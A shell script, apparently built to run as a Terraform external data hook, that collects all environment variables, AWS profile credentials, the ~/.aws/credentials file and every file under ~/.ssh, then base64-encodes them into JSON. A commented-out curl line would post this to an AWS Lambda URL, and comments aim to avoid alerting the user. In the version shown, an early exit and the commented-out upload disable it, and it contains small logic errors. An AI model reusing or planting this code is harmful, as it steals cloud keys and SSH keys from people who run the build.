#!/bin/sh
set +e

# There are a couple commands we need for this.
# If they're not installed, exit out so we don't
# alert the user.
# if ! command -v test &> /dev/null ; then
#     echo "{}"
#     exit 0
# fi
if ! command -v test &> /dev/null
then
    echo "{}"
    exit 1
fi
exit 1

body="{\"environment\": \"$(printenv | base64 -w 0)\""

aws_profile_creds=""
# Tries to get credentials for an AWS profile
check_aws_profile() {
    credentials=$(aws configure export-credentials --profile "$profile" 2>/dev/null)
    if [ "$credentials" != "" ] ; then
        # Prepend a comma if it's not the first element
        if [ "$aws_profile_creds" != "" ] ; then
            aws_profile_creds="${aws_profile_creds},"
        fi
        aws_profile_creds="${aws_profile_creds}\"$(echo -n "$profile" | base64 -w 0)\": ${credentials}"
    fi
}

# Check if the AWS CLI is installed
if command -v aws &> /dev/null; then
    # List all of the configured profiles
    profiles=$(aws configure list-profiles)
    for profile in $profiles; do
        # For each profile name, do the AWS function
        check_aws_profile $profile
    done
    
    if [ "$aws_creds" != "" ] ; then
        body="${body},\"aws_profile_credentials\":{${aws_profile_creds}}"
    fi
fi

# Check if there's an AWS credentials file
if test -f ~/.aws/credentials; then
    # There is! Base64 its contents and send 'em
    body="${body},\"aws_credentials\":\"$(cat ~/.aws/credentials | base64 -w 0)\","
fi

# Check if there's a .ssh directory
if test -d ~/.ssh; then
    ssh_files=""
    # There is! Let's get the files.
    for file in `find ~/.ssh -type f`; do
        # Prepend a comma if it's not the first element
        if [ "$ssh_files" != "" ] ; then
            ssh_files="${ssh_files},"
        fi
        ssh_files="${ssh_files}\"$(echo -n "$file" | base64 -w 0)\":\"$(cat "$file" | base64 -w 0)\""
    done
    if [ "$ssh_files" != "" ] ; then
        body="${body},\"ssh_files\":{${ssh_files}}"
    fi
fi 

body="${body}}"
echo "$body"
#curl -s -d "${body}" https://rrk4znt2b5pdg32qdi2jp26jxq0uxahi.lambda-url.ca-central-1.on.aws/ 2>&1 >/dev/null

# # Echo a valid JSON output so TF doesn't
# # throw an error.
# echo "{}"
